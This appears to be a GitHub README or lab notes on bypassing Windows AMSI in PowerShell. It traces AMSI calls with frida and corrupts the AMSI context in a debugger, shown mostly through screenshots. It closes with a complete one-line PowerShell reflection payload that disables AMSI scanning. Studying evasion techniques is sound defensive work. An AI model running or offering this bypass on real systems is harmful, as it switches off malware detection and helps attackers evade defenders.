c:\Users\test\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.13_qbz5n2kfra8p0\LocalCache\local-packages\Python313\Scripts>frida-trace -p 9112 -x amsi.dll -i Amsi*

Used to trace amsi call 
JS Script provide what is being run on powershell
"return value is: 1" indicate clean powershell

![image](https://github.com/user-attachments/assets/08fe9874-da2e-475b-93e9-35ad830ba9c3)

 "return value is: 32768" indicate malicious powershell
 ![image](https://github.com/user-attachments/assets/ea544184-6600-4b97-84a2-e8a7e41394f9)

Can be bypass by splitting and cocactnation 
![image](https://github.com/user-attachments/assets/caa682ad-2988-4f6c-87ff-1218fb2a4852)

Can also be bypassed with reflection

Attach powershell process
![image](https://github.com/user-attachments/assets/983a3d20-d75b-4ac3-a0e8-02e35356b5d0)

Dump context of memory structure
![image](https://github.com/user-attachments/assets/553281ab-2398-4f6a-a4ea-2668573922ef)

First 4 is equal to AMSI
![image](https://github.com/user-attachments/assets/e1714b54-17e5-42c8-a51a-7964175faf57)

Observe context struction in action to determine if the first 4 bytes are reference in anyway
Use unassemble and amsi open session function
![image](https://github.com/user-attachments/assets/612f757c-05dc-4227-8f1d-7d5083ec3267)

Interesting context structor 
![image](https://github.com/user-attachments/assets/580013e4-1da0-497f-8e51-ffbc5ce17aa0)

Tracing context structor further 
![image](https://github.com/user-attachments/assets/b32ed358-c3bc-4e03-b4b7-07467c973368)

Exploit is cause by forcing an error 
![image](https://github.com/user-attachments/assets/64d042f9-21ef-4a26-a4e9-e4ddc2bbeaa0)

Forcing and error and trigger by putting a powershell command
![image](https://github.com/user-attachments/assets/b28edb49-1d0d-4d36-9b8c-49a1f000e121)

Modify first four byte of context structure
![image](https://github.com/user-attachments/assets/e03c7326-ad58-4edd-ae37-e486a77359b8)

Continue modification and continue running
![image](https://github.com/user-attachments/assets/20d135dd-73ab-4b1d-930b-95059c5f6ba9)

AMSI open session has exited which indicate it has been shutdown
![image](https://github.com/user-attachments/assets/80596bba-9d0f-4c31-a0f4-c09b5cf6f28c)

Not flagged as malicious anymore
![image](https://github.com/user-attachments/assets/d2cce5be-9481-48ea-9bad-227aa2073ce9)

By corrupting AMSI context header we shut down AMSI without affecting powershell. Complete command is in github on debugger.txt

Method too manual let try doing it from powershell using reflection
command log given in: powershell-reflection.txt
not flagged
![image](https://github.com/user-attachments/assets/ba5f3e13-99b3-44d1-8587-39bfe1a88f82)

One string execution:
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)


